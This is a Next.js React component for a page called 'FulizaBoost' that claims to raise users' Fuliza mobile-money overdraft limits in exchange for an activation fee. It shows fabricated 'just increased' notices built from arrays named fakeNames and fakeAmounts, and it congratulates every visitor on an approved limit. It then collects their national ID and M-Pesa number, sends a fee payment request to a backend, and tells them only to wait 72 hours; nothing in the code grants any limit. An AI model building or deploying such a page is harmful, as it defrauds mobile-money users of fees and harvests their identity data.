"use client";

import React, { useEffect, useState } from "react";

type Limit = {
  id: string;
  amount: number;
  fee: number;
};

const limits: Limit[] = [
  { id: "l1", amount: 5000, fee: 150 },
  { id: "l2", amount: 7500, fee: 180 },
  { id: "l3", amount: 10000, fee: 200 },
  { id: "l4", amount: 12500, fee: 230 },
  { id: "l5", amount: 16000, fee: 250 },
  { id: "l6", amount: 21000, fee: 300 },
  { id: "l7", amount: 25500, fee: 350 },
  { id: "l8", amount: 30000, fee: 400 },
  { id: "l9", amount: 35000, fee: 450 },
  { id: "l10", amount: 40000, fee: 540 },
  { id: "l11", amount: 45000, fee: 680 },
  { id: "l12", amount: 50000, fee: 960 },
  { id: "l13", amount: 60000, fee: 1550 },
  { id: "l14", amount: 70000, fee: 2000 },
];

const fakeNames = ["James", "Brian", "Mercy", "Kevin", "Faith", "Dennis", "Sharon", "Allan"];
const fakeAmounts = [15000, 20000, 34000, 50000, 25000, 42000, 30000];

export default function FulizaBoost() {
  const [selectedLimit, setSelectedLimit] = useState<Limit | null>(null);
  const [loadingId, setLoadingId] = useState<string | null>(null);
  const [showModal, setShowModal] = useState(false);
  const [phone, setPhone] = useState("");
  const [idNumber, setIdNumber] = useState("");
  const [success, setSuccess] = useState(false);
  const [recent, setRecent] = useState({ name: "", amount: 0 });

  /* Rotating trust notification */
  useEffect(() => {
    const generate = () => {
      const name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
      const amount = fakeAmounts[Math.floor(Math.random() * fakeAmounts.length)];
      setRecent({ name, amount });
    };
    generate();
    const interval = setInterval(generate, 2000);
    return () => clearInterval(interval);
  }, []);

  const handleBuy = async () => {
    if (!selectedLimit) return;
    if (!phone || !idNumber) return;

    setLoadingId(selectedLimit.id);

    const BACKEND_URL =
      process.env.NEXT_PUBLIC_BACKEND_URL || "http://localhost:5000";

    try {
      const res = await fetch(`${BACKEND_URL}/api/runPrompt`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          phone,
          amount: selectedLimit.fee,
          local_id: `O${Date.now().toString(36)}`,
          transaction_desc: `Fuliza increase to Ksh ${selectedLimit.amount}`,
        }),
      });

      const data = await res.json();

      if (data.status) {
        setSuccess(true);
      }
    } catch (err) {
      console.log(err);
    } finally {
      setLoadingId(null);
    }
  };

  return (
    <div className="min-h-screen bg-[#f1fdf5] flex justify-center">
      <div className="w-full max-w-md pb-16">

        {/* Header */}
        <div className="bg-[#00A651] text-white text-center py-5 font-bold text-lg shadow-md">
          Fuliza Limit Increase
        </div>

        {/* Title */}
        <div className="text-center mt-6">
          <h2 className="text-2xl font-bold text-[#00A651]">
            FulizaBoost
          </h2>
          <p className="text-xs text-gray-600 mt-1">
            Fast • Secure • Reliable
          </p>
        </div>

        {/* Live Notification */}
        <div className="mx-4 mt-6 bg-green-100 border border-green-300 p-3 rounded-xl text-sm text-green-800 shadow-sm">
          {recent.name} 07*** just increased to{" "}
          <strong>Ksh {recent.amount.toLocaleString()}</strong> — just now
        </div>

        {/* Select Title */}
        <div className="mx-4 mt-6 text-[#008043] font-semibold text-sm">
          Select Your New Limit
        </div>

        {/* Limit Grid */}
        <div className="grid grid-cols-2 gap-4 px-4 mt-4">
          {limits.map((limit) => (
            <div
              key={limit.id}
              onClick={() => setSelectedLimit(limit)}
              className={`p-4 rounded-2xl cursor-pointer transition-all duration-300 text-center shadow-md hover:shadow-lg ${
                selectedLimit?.id === limit.id
                  ? "bg-[#00A651] text-white scale-105"
                  : "bg-white border border-green-200"
              }`}
            >
              <div className="font-semibold">
                Ksh {limit.amount.toLocaleString()}
              </div>
              <div className="text-xs opacity-80">
                Activation Fee: Ksh {limit.fee}
              </div>
            </div>
          ))}
        </div>

        {/* Activate Button */}
        <div className="px-4 mt-6">
          <button
            onClick={() => selectedLimit && setShowModal(true)}
            className="w-full bg-[#00A651] hover:bg-[#008043] transition text-white py-3 rounded-xl font-semibold shadow-md"
          >
            Activate Now
          </button>
        </div>

        {/* Modal */}
        {showModal && selectedLimit && (
          <div className="fixed inset-0 bg-black/40 flex justify-center items-center px-4">
            <div className="bg-white rounded-2xl p-6 w-full max-w-sm shadow-2xl animate-fadeIn">

              {!success ? (
                <>
                  <div className="text-center text-[#00A651] font-bold text-lg mb-4">
                    🎉 Congrats! Your limit is Ksh {selectedLimit.amount.toLocaleString()}
                  </div>

                  <input
                    type="text"
                    placeholder="Enter ID Number"
                    value={idNumber}
                    onChange={(e) => setIdNumber(e.target.value)}
                    className="w-full border rounded-xl p-3 mb-3 text-sm focus:ring-2 focus:ring-green-500 outline-none"
                  />

                  <input
                    type="tel"
                    placeholder="Enter M-Pesa Number"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value)}
                    className="w-full border rounded-xl p-3 mb-4 text-sm focus:ring-2 focus:ring-green-500 outline-none"
                  />

                  <button
                    onClick={handleBuy}
                    disabled={loadingId !== null}
                    className="w-full bg-[#00A651] text-white py-3 rounded-xl font-semibold"
                  >
                    {loadingId ? "Processing..." : `Pay Ksh ${selectedLimit.fee}`}
                  </button>
                </>
              ) : (
                <div className="text-center">
                  <div className="text-[#00A651] font-bold text-lg mb-3">
                    ✅ Congratulations!
                  </div>
                  <p className="text-gray-600 text-sm">
                    Your request has been received.  
                    Please wait 72 hours for processing.
                  </p>
                </div>
              )}
            </div>
          </div>
        )}

      </div>
    </div>
  );
}
